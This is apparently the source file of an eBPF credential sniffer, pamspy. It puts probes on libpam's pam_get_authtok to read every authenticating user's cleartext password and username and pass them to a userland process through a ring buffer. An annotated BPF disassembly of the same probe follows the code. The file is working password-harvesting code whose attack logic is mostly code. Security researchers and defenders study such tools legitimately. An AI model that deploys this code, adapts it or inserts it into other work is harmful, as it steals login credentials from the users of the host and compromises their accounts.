// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include "pamspy_event.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

/******************************************************************************/
/*!
 *  \brief  dump from source code of libpam
 *          This is a partial header
 */
typedef struct pam_handle
{
	char *authtok;
	unsigned caller_is;
	void *pam_conversation;
	char *oldauthtok;
	char *prompt; /* for use by pam_get_user() */
	char *service_name;
	char *user;
	char *rhost;
	char *ruser;
	char *tty;
	char *xdisplay;
	char *authtok_type; /* PAM_AUTHTOK_TYPE */
	void *data;
	void *env; /* structure to maintain environment list */
} pam_handle_t;

/******************************************************************************/
/*!
 *  \brief  ring buffer use to communicate with userland process
 */
struct
{
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 256 * 1024);
} rb SEC(".maps");

/******************************************************************************/
/*!
 *  \brief  bpf hash map use to store pam_handle_t pointer
 */
struct
{
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(key_size, sizeof(uint32_t));
	__uint(value_size, sizeof(pam_handle_t *));
	__uint(max_entries, 1024);
} pam_handle_t_map SEC(".maps");

/******************************************************************************/
/*!
 *  \brief  main userland probe program
 *
 *  int pam_get_authtok(pam_handle_t *pamh, int item,
 *                         const char **authtok, const char *prompt);
 *
 */

SEC("uprobe/pam_get_authtok")
int get_addr_pam_get_authtok(struct pt_regs *ctx)
{
	if (!PT_REGS_PARM1(ctx))
		return 0;

	pam_handle_t *phandle = (pam_handle_t *)PT_REGS_PARM1(ctx);

	// Get current PID to track
	u32 pid = bpf_get_current_pid_tgid() >> 32;

	// Store pam_handle_t pointer in map for later use
	bpf_map_update_elem(&pam_handle_t_map, &pid, &phandle, BPF_ANY);

	return 0;
};

SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
	pam_handle_t *phandle = 0;

	// Get current PID to track
	u32 pid = bpf_get_current_pid_tgid() >> 32;

	// Get pam_handle_t pointer from map
	void *pam_handle_t_ptr = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
	if (!pam_handle_t_ptr)
		return 0;

	bpf_probe_read(&phandle, sizeof(phandle), pam_handle_t_ptr);

	// Delete map entry after use
	if (bpf_map_delete_elem(&pam_handle_t_map, &pid))
		return 0;

	// retrieve output parameter
	u64 password_addr = 0;
	bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);

	u64 username_addr = 0;
	bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

	event_t *e;
	e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
	if (e)
	{
		e->pid = pid;
		bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
		bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
		bpf_get_current_comm(&e->comm, sizeof(e->comm));
		bpf_ringbuf_submit(e, 0);
	}

	return 0;
};


/*

 0:	b7 01 00 00 00 00 00 00	r1 = 0            // r1 = 0 (NULL pointer)
       1:	7b 1a f8 ff 00 00 00 00	[r10 - 0x8] = r1   // store NULL at stack[-8] → pam_handle_t *phandle = 0;
       2:	85 00 00 00 0e 00 00 00	call 0xe          // call bpf_get_current_pid_tgid()
       3:	77 00 00 00 20 00 00 00	r0 >>= 32         // extract PID (upper 32 bits)
       4:	63 0a f4 ff 00 00 00 00	[r10 - 0xc] = r0   // store pid at stack[-12]
       5:	bf a2 00 00 00 00 00 00	r2 = r10
       6:	07 02 00 00 f4 ff ff ff	r2 += -0xc        // r2 points to &pid
       7:	18 01 00 00 00 00 00 00 00...	r1 = map_fd     // r1 = &pam_handle_t_map
       9:	85 00 00 00 01 00 00 00	call 0x1          // call bpf_map_lookup_elem
      10:	15 00 33 00 00 00 00 00	if r0 == 0 goto +0x33 // if !pam_handle_t_ptr return 0
      11:	bf a1 00 00 00 00 00 00	r1 = r10
      12:	07 01 00 00 f8 ff ff ff	r1 += -0x8        // r1 = &phandle
      13:	b7 02 00 00 08 00 00 00	r2 = 8            // sizeof(phandle)
      14:	bf 03 00 00 00 00 00 00	r3 = r0           // r3 = pam_handle_t_ptr
      15:	85 00 00 00 04 00 00 00	call 0x4          // call bpf_probe_read(&phandle, 8, pam_handle_t_ptr)
      16:	bf a2 00 00 00 00 00 00	r2 = r10
      17:	07 02 00 00 f4 ff ff ff	r2 += -0xc        // r2 = &pid
      18:	18 01 00 00 00 00 00 00 00...	r1 = map_fd     // r1 = &pam_handle_t_map
      20:	85 00 00 00 03 00 00 00	call 0x3          // call bpf_map_delete_elem
      21:	55 00 28 00 00 00 00 00	if r0 != 0 goto +0x28 // if deletion fails, return 0
      22:	b7 06 00 00 00 00 00 00	r6 = 0            // password_addr = 0
      23:	7b 6a e8 ff 00 00 00 00	[r10 - 0x18] = r6 // store at stack[-24]
      24:	79 a3 f8 ff 00 00 00 00	r3 = [r10 - 0x8]  // r3 = phandle
      25:	bf a1 00 00 00 00 00 00	r1 = r10
      26:	07 01 00 00 e8 ff ff ff	r1 += -0x18       // r1 = &password_addr
      27:	b7 02 00 00 08 00 00 00	r2 = 8
      28:	85 00 00 00 04 00 00 00	call 0x4          // bpf_probe_read(&password_addr, 8, &phandle->authtok)
      29:	7b 6a e0 ff 00 00 00 00	[r10 - 0x20] = r6 // username_addr = 0
      30:	79 a3 f8 ff 00 00 00 00	r3 = [r10 - 0x8]  // r3 = phandle
      31:	07 03 00 00 30 00 00 00	r3 += 0x30        // r3 = &phandle->user (offset 0x30)
      32:	bf a1 00 00 00 00 00 00	r1 = r10
      33:	07 01 00 00 e0 ff ff ff	r1 += -0x20       // r1 = &username_addr
      34:	b7 02 00 00 08 00 00 00	r2 = 8
      35:	85 00 00 00 04 00 00 00	call 0x4          // bpf_probe_read(&username_addr, 8, &phandle->user)
      36:	18 01 00 00 00...         r1 = ringbuf_fd
      38:	b7 02 00 00 b4 00 00 00	r2 = sizeof(event_t)
      39:	b7 03 00 00 00 00 00 00	r3 = 0
      40:	85 00 00 00 83 00 00 00	call 0x83         // e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0)
      41:	15 00 14 00 00 00 00 00	if r0 == 0 goto +0x14 // if (!e) skip
      42:	61 a1 f4 ff 00 00 00 00	r1 = [r10 - 0xc]  // r1 = pid
      43:	63 10 00 00 00 00 00 00	[r0 + 0] = r1     // e->pid = pid
      44:	79 a3 e8 ff 00 00 00 00	r3 = [r10 - 0x18] // r3 = password_addr
      45:	bf 01 00 00 00 00 00 00	r1 = r0
      46:	07 01 00 00 64 00 00 00	r1 += 0x64        // r1 = &e->password
      47:	b7 02 00 00 50 00 00 00	r2 = 0x50         // sizeof(password)
      48:	bf 06 00 00 00 00 00 00	r6 = r0           // cache event pointer
      49:	85 00 00 00 04 00 00 00	call 0x4          // bpf_probe_read(&e->password, 0x50, (void*)password_addr)
      50:	79 a3 e0 ff 00 00 00 00	r3 = [r10 - 0x20] // r3 = username_addr
      51:	bf 61 00 00 00 00 00 00	r1 = r6
      52:	07 01 00 00 14 00 00 00	r1 += 0x14        // r1 = &e->username
      53:	b7 02 00 00 50 00 00 00	r2 = 0x50
      54:	85 00 00 00 04 00 00 00	call 0x4          // bpf_probe_read(&e->username, 0x50, (void*)username_addr)
      55:	bf 61 00 00 00 00 00 00	r1 = r6
      56:	07 01 00 00 04 00 00 00	r1 += 0x4         // r1 = &e->comm
      57:	b7 02 00 00 10 00 00 00	r2 = 0x10
      58:	85 00 00 00 10 00 00 00	call 0x10         // bpf_get_current_comm(&e->comm, 0x10)
      59:	bf 61 00 00 00 00 00 00	r1 = r6
      60:	b7 02 00 00 00 00 00 00	r2 = 0
      61:	85 00 00 00 84 00 00 00	call 0x84         // bpf_ringbuf_submit(e, 0)
      62:	b7 00 00 00 00 00 00 00	r0 = 0
      63:	95 00 00 00 00 00 00 00	exit              // return 0

Disassembly of section uretprobe/pam_get_authtok:

0000000000000000 <trace_pam_get_authtok>:
       0:	b7 01 00 00 00 00 00 00	r1 = 0x0
       1:	7b 1a f8 ff 00 00 00 00	*(u64 *)(r10 - 0x8) = r1
       2:	85 00 00 00 0e 00 00 00	call 0xe
       3:	77 00 00 00 20 00 00 00	r0 >>= 0x20
       4:	63 0a f4 ff 00 00 00 00	*(u32 *)(r10 - 0xc) = r0
       5:	bf a2 00 00 00 00 00 00	r2 = r10
       6:	07 02 00 00 f4 ff ff ff	r2 += -0xc
       7:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
       9:	85 00 00 00 01 00 00 00	call 0x1
      10:	15 00 33 00 00 00 00 00	if r0 == 0x0 goto +0x33 <trace_pam_get_authtok+0x1f0>
      11:	bf a1 00 00 00 00 00 00	r1 = r10
      12:	07 01 00 00 f8 ff ff ff	r1 += -0x8
      13:	b7 02 00 00 08 00 00 00	r2 = 0x8
      14:	bf 03 00 00 00 00 00 00	r3 = r0
      15:	85 00 00 00 04 00 00 00	call 0x4
      16:	bf a2 00 00 00 00 00 00	r2 = r10
      17:	07 02 00 00 f4 ff ff ff	r2 += -0xc
      18:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
      20:	85 00 00 00 03 00 00 00	call 0x3
      21:	55 00 28 00 00 00 00 00	if r0 != 0x0 goto +0x28 <trace_pam_get_authtok+0x1f0>
      22:	b7 06 00 00 00 00 00 00	r6 = 0x0
      23:	7b 6a e8 ff 00 00 00 00	*(u64 *)(r10 - 0x18) = r6
      24:	79 a3 f8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x8)
      25:	bf a1 00 00 00 00 00 00	r1 = r10
      26:	07 01 00 00 e8 ff ff ff	r1 += -0x18
      27:	b7 02 00 00 08 00 00 00	r2 = 0x8
      28:	85 00 00 00 04 00 00 00	call 0x4
      29:	7b 6a e0 ff 00 00 00 00	*(u64 *)(r10 - 0x20) = r6
      30:	79 a3 f8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x8)
      31:	07 03 00 00 30 00 00 00	r3 += 0x30
      32:	bf a1 00 00 00 00 00 00	r1 = r10
      33:	07 01 00 00 e0 ff ff ff	r1 += -0x20
      34:	b7 02 00 00 08 00 00 00	r2 = 0x8
      35:	85 00 00 00 04 00 00 00	call 0x4
      36:	18 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00	r1 = 0x0 ll
      38:	b7 02 00 00 b4 00 00 00	r2 = 0xb4
      39:	b7 03 00 00 00 00 00 00	r3 = 0x0
      40:	85 00 00 00 83 00 00 00	call 0x83
      41:	15 00 14 00 00 00 00 00	if r0 == 0x0 goto +0x14 <trace_pam_get_authtok+0x1f0>
      42:	61 a1 f4 ff 00 00 00 00	r1 = *(u32 *)(r10 - 0xc)
      43:	63 10 00 00 00 00 00 00	*(u32 *)(r0 + 0x0) = r1
      44:	79 a3 e8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x18)
      45:	bf 01 00 00 00 00 00 00	r1 = r0
      46:	07 01 00 00 64 00 00 00	r1 += 0x64
      47:	b7 02 00 00 50 00 00 00	r2 = 0x50
      48:	bf 06 00 00 00 00 00 00	r6 = r0
      49:	85 00 00 00 04 00 00 00	call 0x4
      50:	79 a3 e0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x20)
      51:	bf 61 00 00 00 00 00 00	r1 = r6
      52:	07 01 00 00 14 00 00 00	r1 += 0x14
      53:	b7 02 00 00 50 00 00 00	r2 = 0x50
      54:	85 00 00 00 04 00 00 00	call 0x4
      55:	bf 61 00 00 00 00 00 00	r1 = r6
      56:	07 01 00 00 04 00 00 00	r1 += 0x4
      57:	b7 02 00 00 10 00 00 00	r2 = 0x10
      58:	85 00 00 00 10 00 00 00	call 0x10
      59:	bf 61 00 00 00 00 00 00	r1 = r6
      60:	b7 02 00 00 00 00 00 00	r2 = 0x0
      61:	85 00 00 00 84 00 00 00	call 0x84
      62:	b7 00 00 00 00 00 00 00	r0 = 0x0
      63:	95 00 00 00 00 00 00 00	exit

*/